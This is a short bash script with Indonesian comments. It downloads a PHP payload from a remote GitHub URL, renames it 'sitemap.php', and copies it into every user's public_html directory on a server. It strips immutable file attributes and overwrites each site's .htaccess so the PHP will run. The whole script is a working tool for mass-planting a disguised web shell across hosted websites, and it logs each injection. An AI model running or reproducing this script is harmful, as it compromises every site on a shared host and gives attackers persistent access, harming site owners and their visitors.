#!/bin/bash

# === Konfigurasi ===
TARGET_NAME="sitemap.php"
PAYLOAD_URL="https://raw.githubusercontent.com/Hecate1337-py/controlkit/refs/heads/main/__sys.php"
SHELL_PATH="/root/$TARGET_NAME"
HTACCESS_PATH="/root/htaccess_$TARGET_NAME"
LOGFILE="/root/injected_${TARGET_NAME}_$(date +%F_%H-%M).log"

# === Ambil payload terbaru ===
curl -s "$PAYLOAD_URL" -o "$SHELL_PATH"
if [ ! -s "$SHELL_PATH" ]; then
  echo "[✘] Payload kosong atau gagal diunduh dari $PAYLOAD_URL"
  exit 1
fi
chmod 644 "$SHELL_PATH"

# === Buat file .htaccess agar PHP tetap bisa jalan ===
cat <<'EOF' > "$HTACCESS_PATH"
<FilesMatch "\.php$">
  SetHandler application/x-httpd-php
</FilesMatch>
EOF
chmod 644 "$HTACCESS_PATH"

# === Eksekusi Injeksi ===
echo "=== Start Inject: $(date) ===" > "$LOGFILE"

for path in /home*/*/public_html; do
  if [ -d "$path" ]; then
    echo "[•] Injecting to $path"
    chattr -i "$path" 2>/dev/null
    chattr -i "$path/$TARGET_NAME" 2>/dev/null
    chattr -i "$path/.htaccess" 2>/dev/null

    cp "$SHELL_PATH" "$path/$TARGET_NAME" 2>/dev/null
    cp "$HTACCESS_PATH" "$path/.htaccess" 2>/dev/null

    if [ -f "$path/$TARGET_NAME" ]; then
      echo "[✓] $path/$TARGET_NAME" | tee -a "$LOGFILE"
    else
      echo "[✘] Gagal inject ke $path" | tee -a "$LOGFILE"
    fi
  fi
done

echo "=== Done at: $(date) ===" >> "$LOGFILE"
echo "[✔] Log saved to $LOGFILE"
